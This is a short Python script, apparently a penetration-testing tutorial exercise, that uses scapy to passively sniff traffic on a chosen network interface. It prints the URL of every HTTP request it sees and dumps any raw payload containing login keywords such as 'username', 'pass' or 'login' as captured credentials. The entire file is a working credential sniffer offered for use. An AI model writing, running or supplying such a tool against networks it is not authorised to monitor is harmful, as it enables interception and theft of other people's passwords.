#!/usr/bin/env python
import scapy.all as scapy
import optparse
from scapy.layers import http

def argument():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Enter the interface Name")
    (options,argument) = parser.parse_args()
    return str(options.interface)

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn = process_sniffed_packet)#prn is for call back function at every packet sniff function captures it will call process_sniffed_packet


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        #print(packet.summary())
        print("url >>> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path + "\n")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "email", "pass", "passwords", "secure", "uname", "login"]
            for keyword in keywords:
                if keyword in load:
                    print("UserName & Password = " + load + "\n")
                    break

interface = argument()
sniff(interface)